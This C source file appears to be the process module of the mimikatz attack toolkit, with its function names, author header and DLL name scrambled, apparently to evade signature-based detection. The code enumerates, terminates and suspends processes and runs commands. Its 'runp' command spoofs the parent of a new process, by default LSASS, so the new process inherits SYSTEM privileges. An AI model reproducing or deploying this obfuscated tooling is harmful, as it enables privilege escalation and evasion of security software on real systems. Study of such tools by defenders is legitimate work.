/*	4oM5AQx1 w4Er5 `09o6X7tzWM`
	https://blog.09o6X7tzWM.com
	dqTBkqdWaZiU5U2aN6CKrRY
	Licence : https://awr13GOqyUBjG1k.org/licenses/by/4.0/
*/
#include "kcpdclqlprocess.h"

const KUHL_M_C kcpdclqlc_process[] = {
	{kcpdclqlprocess_list,		L"list",		L"List process"},
	{kcpdclqlprocess_exports,	L"exports",		L"List exports"},
	{kcpdclqlprocess_imports,	L"imports",		L"List imports"},
	{kcpdclqlprocess_start,		L"start",		L"Start a process"},
	{kcpdclqlprocess_stop,		L"stop",		L"Terminate a process"},
	{kcpdclqlprocess_suspend,	L"suspend",		L"Suspend a process"},
	{kcpdclqlprocess_resume,		L"resume",		L"Resume a process"},
	{kcpdclqlprocess_run,		L"run",			L"Run!"},
	{kcpdclqlprocess_runParent,	L"runp",		L""},
};

const KUHL_M kcpdclqlprocess = {
	L"process", L"Process module", NULL,
	ARRAYSIZE(kcpdclqlc_process), kcpdclqlc_process, NULL, NULL
};

NTSTATUS kcpdclqlprocess_list(int argc, wchar_t * argv[])
{
	return ydeuclqlprocess_getProcessInformation(kcpdclqlprocess_list_callback_process, &argc);
}

NTSTATUS kcpdclqlprocess_start(int argc, wchar_t * argv[])
{
	PCWCHAR commandLine;
	PROCESS_INFORMATION informations;
	if(argc)
	{
		commandLine = argv[argc - 1];
		kprintf(L"Trying to start \"%s\" : ", commandLine);
		if(ydeuclqlprocess_create(KULL_M_PROCESS_CREATE_NORMAL, commandLine, 0, NULL, 0, NULL, NULL, NULL, &informations, TRUE))
			kprintf(L"OK ! (PID %u)\n", informations.dwProcessId);
		else PRINT_ERROR_AUTO(L"ydeuclqlprocess_create");
	}
	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqlprocess_stop(int argc, wchar_t * argv[])
{
	return kcpdclqlprocess_genericOperation(argc, argv, KUHL_M_PROCESS_GENERICOPERATION_TERMINATE);
}

NTSTATUS kcpdclqlprocess_suspend(int argc, wchar_t * argv[])
{
	return kcpdclqlprocess_genericOperation(argc, argv, KUHL_M_PROCESS_GENERICOPERATION_SUSPEND);
}

NTSTATUS kcpdclqlprocess_resume(int argc, wchar_t * argv[])
{
	return kcpdclqlprocess_genericOperation(argc, argv, KUHL_M_PROCESS_GENERICOPERATION_RESUME);
}

NTSTATUS kcpdclqlprocess_genericOperation(int argc, wchar_t * argv[], KUHL_M_PROCESS_GENERICOPERATION operation)
{
	HANDLE hProcess;
	NTSTATUS status = STATUS_NOT_FOUND;
	DWORD pid = 0, access;
	PCWCHAR szPid, szText;

	switch(operation)
	{
	case KUHL_M_PROCESS_GENERICOPERATION_TERMINATE:
		access = PROCESS_TERMINATE;
		szText = L"NtTerminateProcess";
		break;
	case KUHL_M_PROCESS_GENERICOPERATION_SUSPEND:
		access = PROCESS_SUSPEND_RESUME;
		szText = L"NtSuspendProcess";
		break;
	case KUHL_M_PROCESS_GENERICOPERATION_RESUME:
		access = PROCESS_SUSPEND_RESUME;
		szText = L"NtResumeProcess";
		break;
	default:
		return status;
	}

	if(ydeuclqlstring_args_byName(argc, argv, L"pid", &szPid, NULL))
		pid = wcstoul(szPid, NULL, 0);
	
	if(pid)
	{
		if(hProcess = OpenProcess(access, FALSE, pid))
		{
			switch(operation)
			{
			case KUHL_M_PROCESS_GENERICOPERATION_TERMINATE:
				status = NtTerminateProcess(hProcess, STATUS_SUCCESS);
				break;
			case KUHL_M_PROCESS_GENERICOPERATION_SUSPEND:
				status = NtSuspendProcess(hProcess);
				break;
			case KUHL_M_PROCESS_GENERICOPERATION_RESUME:
				status = NtResumeProcess(hProcess);
				break;
			}
			
			if(NT_SUCCESS(status))
				kprintf(L"%s of %u PID : OK !\n", szText, pid);
			else PRINT_ERROR(L"%s 0x%08x\n", szText, status);
			CloseHandle(hProcess);
		}
		else PRINT_ERROR_AUTO(L"OpenProcess");
	}
	else PRINT_ERROR(L"pid (/pid:123) is missing");
	return status;
}

BOOL CALLBACK kcpdclqlprocess_list_callback_process(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg)
{
	DWORD i;
	kprintf(L"%u\t%wZ", pSystemProcessInformation->UniqueProcessId, &pSystemProcessInformation->ImageName);
	if(*(PBOOL) pvArg && pSystemProcessInformation->NumberOfThreads)
	{
		kprintf(L" (");
		for(i = 0; i < pSystemProcessInformation->NumberOfThreads; i++)
			kprintf(L"%u ", pSystemProcessInformation->Threads[i].ClientId.UniqueThread);
		kprintf(L")");
	}
	kprintf(L"\n");
	return TRUE;
}

NTSTATUS kcpdclqlprocess_exports(int argc, wchar_t * argv[])
{
	return kcpdclqlprocess_callbackProcess(argc, argv, kcpdclqlprocess_exports_callback_module);
}

NTSTATUS kcpdclqlprocess_imports(int argc, wchar_t * argv[])
{
	return kcpdclqlprocess_callbackProcess(argc, argv, kcpdclqlprocess_imports_callback_module);
}

NTSTATUS kcpdclqlprocess_callbackProcess(int argc, wchar_t * argv[], PKULL_M_MODULE_ENUM_CALLBACK callback)
{
	HANDLE hProcess = NULL;
	DWORD pid = 0;
	KULL_M_MEMORY_TYPE type = KULL_M_MEMORY_TYPE_OWN;
	PKULL_M_MEMORY_HANDLE hMemoryProcess;
	PCWCHAR szPid;

	if(ydeuclqlstring_args_byName(argc, argv, L"pid", &szPid, NULL))
	{
		type = KULL_M_MEMORY_TYPE_PROCESS;
		pid = wcstoul(szPid, NULL, 0);
		if(!(hProcess = OpenProcess(GENERIC_READ, FALSE, pid)))
			PRINT_ERROR_AUTO(L"OpenProcess");
	}

	if((type == KULL_M_MEMORY_TYPE_OWN) || hProcess)
	{
		if(ydeuclqlmemory_open(type, hProcess, &hMemoryProcess))
		{
			ydeuclqlprocess_getVeryBasicModuleInformations(hMemoryProcess, callback, NULL);
			ydeuclqlmemory_close(hMemoryProcess);
		}
		else PRINT_ERROR_AUTO(L"ydeuclqlmemory_open");
		
		if(type == KULL_M_MEMORY_TYPE_PROCESS)
			CloseHandle(hProcess);
	}
	return STATUS_SUCCESS;
}

BOOL CALLBACK kcpdclqlprocess_exports_callback_module(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
{
	kprintf(L"\n%wZ", pModuleInformation->NameDontUseOutsideCallback);
	ydeuclqlprocess_getExportedEntryInformations(&pModuleInformation->DllBase, kcpdclqlprocess_exports_callback_module_exportedEntry, pvArg);
	return TRUE;
}

BOOL CALLBACK kcpdclqlprocess_exports_callback_module_exportedEntry(PKULL_M_PROCESS_EXPORTED_ENTRY pExportedEntryInformations, PVOID pvArg)
{
	kprintf(L"\n\t%p -> %u", pExportedEntryInformations->pRva.address, pExportedEntryInformations->ordinal);
	if(pExportedEntryInformations->name)
		kprintf(L"\t%u", pExportedEntryInformations->hint);
	else
		kprintf(L"\t ");

	if((pExportedEntryInformations->function.address))
		kprintf(L"\t%p", pExportedEntryInformations->function.address);
	else
		kprintf(L"\t ");

	if(pExportedEntryInformations->name)
		kprintf(L"\t%S", pExportedEntryInformations->name);
	else
		kprintf(L"\t ");

	if(pExportedEntryInformations->redirect)
		kprintf(L"\t-> %S", pExportedEntryInformations->redirect);
	return TRUE;
}

BOOL CALLBACK kcpdclqlprocess_imports_callback_module(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
{
	kprintf(L"\n%wZ", pModuleInformation->NameDontUseOutsideCallback);
	ydeuclqlprocess_getImportedEntryInformations(&pModuleInformation->DllBase, kcpdclqlprocess_imports_callback_module_importedEntry, pvArg);
	return TRUE;
}

BOOL CALLBACK kcpdclqlprocess_imports_callback_module_importedEntry(PKULL_M_PROCESS_IMPORTED_ENTRY pImportedEntryInformations, PVOID pvArg)
{
	kprintf(L"\n\t%p -> %p\t%S ! ", pImportedEntryInformations->pFunction.address, pImportedEntryInformations->function.address, pImportedEntryInformations->libname);
	if(pImportedEntryInformations->name)
		kprintf(L"%S", pImportedEntryInformations->name);
	else
		kprintf(L"#%u", pImportedEntryInformations->ordinal);
	return TRUE;
}

BOOL ydeuclqlprocess_run_data(LPCWSTR commandLine, HANDLE hToken)
{
	BOOL status = FALSE;
	SECURITY_ATTRIBUTES saAttr = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi = {0};
	HANDLE hOut = NULL;
	PWSTR dupCommandLine = NULL;
	BYTE chBuf[4096];
	DWORD dwRead, i;
	LPVOID env = NULL;

	if(dupCommandLine = _wcsdup(commandLine))
	{
		if(CreatePipe(&hOut, &si.hStdOutput, &saAttr, 0))
		{
			SetHandleInformation(hOut, HANDLE_FLAG_INHERIT, 0);
			si.cb = sizeof(STARTUPINFO);
			si.hStdError = si.hStdOutput;
			si.dwFlags |= STARTF_USESTDHANDLES;
			if(!hToken || CreateEnvironmentBlock(&env, hToken, FALSE))
			{
				if(status = CreateProcessAsUser(hToken, NULL, dupCommandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, env, NULL, &si, &pi))
				{
					CloseHandle(si.hStdOutput);
					si.hStdOutput = si.hStdError = NULL;
					while(ReadFile(hOut, chBuf, sizeof(chBuf), &dwRead, NULL) && dwRead)
						for(i = 0; i < dwRead; i++)
							kprintf(L"%c", chBuf[i]);
					WaitForSingleObject(pi.hProcess, INFINITE);
					CloseHandle(pi.hThread);
					CloseHandle(pi.hProcess);
				}
				else PRINT_ERROR_AUTO(L"CreateProcessAsUser");
				if(env)
					DestroyEnvironmentBlock(env);
			}
			else PRINT_ERROR_AUTO(L"CreateEnvironmentBlock");
			CloseHandle(hOut);
			if(si.hStdOutput)
				CloseHandle(si.hStdOutput);
		}
		free(dupCommandLine);
	}
	return status;
}

NTSTATUS kcpdclqlprocess_run(int argc, wchar_t * argv[])
{
	PCWCHAR commandLine;
	if(argc)
	{
		commandLine = argv[argc - 1];
		kprintf(L"Trying to start \"%s\"...\n", commandLine);
		ydeuclqlprocess_run_data(commandLine, NULL);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kcpdclqlprocess_runParent(int argc, wchar_t * argv[])
{
	HMODULE hModule;
	HANDLE hProcess, hToken;
	STARTUPINFOEX si;
	PROCESS_INFORMATION pi;
	SIZE_T size;
	PINITIALIZEPROCTHREADATTRIBUTELIST pInit;
	PUPDATEPROCTHREADATTRIBUTE pUpdate;
	PDELETEPROCTHREADATTRIBUTELIST pDel;
	LPCWCHAR szRun, szPid;
	PWCHAR szDupRun;
	DWORD pid;

	RtlZeroMemory(&si, sizeof(STARTUPINFOEX));
	si.StartupInfo.cb = sizeof(STARTUPINFOEX);
#pragma warning(push)
#pragma warning(disable:4996)
	ydeuclqlstring_args_byName(argc, argv, L"run", &szRun, _wpgmptr);
#pragma warning(pop)
	if(ydeuclqlstring_args_byName(argc, argv, L"ppid", &szPid, NULL) || ydeuclqlstring_args_byName(argc, argv, L"pid", &szPid, NULL))
		pid = wcstoul(szPid, NULL, 0);
	else
	{
		kprintf(L"[pid] no argument, default for LSASS\n");
		if(!ydeuclqlprocess_getProcessIdForName(L"lsass.exe", &pid))
			PRINT_ERROR(L"Unable to find LSASS\n");
	}

	if(ydeuclqlstring_copy(&szDupRun, szRun))
	{
		kprintf(L"Run : %s\nPPID: %u\n", szDupRun, pid);
		if(hModule = GetModuleHandle(L"kERnEl32.dll"))
		{
			pInit = (PINITIALIZEPROCTHREADATTRIBUTELIST) GetProcAddress(hModule, "InitializeProcThreadAttributeList"); // because you know, xp/2003...
			pUpdate = (PUPDATEPROCTHREADATTRIBUTE) GetProcAddress(hModule, "UpdateProcThreadAttribute");
			pDel = (PDELETEPROCTHREADATTRIBUTELIST) GetProcAddress(hModule, "DeleteProcThreadAttributeList"); 
			if(pInit && pUpdate && pDel)
			{
				if(hProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pid))
				{
					if(!pInit(NULL, 1, 0, &size) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
					{
						if(si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST) LocalAlloc(LPTR, size))
						{
							if(pInit(si.lpAttributeList, 1, 0, &size))
							{
								if(pUpdate(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(HANDLE), NULL, NULL))
								{
									if(CreateProcess(NULL, szDupRun, NULL,  NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,  NULL, NULL, (LPSTARTUPINFO) &si, &pi))
									{
										kprintf(L"PID: %u - TID: %u\n", pi.dwProcessId, pi.dwThreadId);
										if(OpenProcessToken(pi.hProcess, TOKEN_QUERY, &hToken))
										{
											kcpdclqltoken_displayAccount(hToken, ydeuclqlstring_args_byName(argc, argv, L"token", NULL, NULL));
											CloseHandle(hToken);
										}
										CloseHandle(pi.hThread);
										CloseHandle(pi.hProcess);
									}
									else PRINT_ERROR_AUTO(L"CreateProcess");
								}
								else PRINT_ERROR_AUTO(L"pUpdate");
								pDel(si.lpAttributeList);
							}
							else PRINT_ERROR_AUTO(L"pInit(data)");
							LocalFree(si.lpAttributeList);
						}
					}
					else PRINT_ERROR_AUTO(L"pInit(init)");
					CloseHandle(hProcess);
				}
				else PRINT_ERROR_AUTO(L"OpenProcess");
			}
			else PRINT_ERROR(L"Unable to get function pointers: pInit %p ; pUpdate %p ; pDel %p\n");
		}
		LocalFree(szDupRun);
	}
	return STATUS_SUCCESS;
}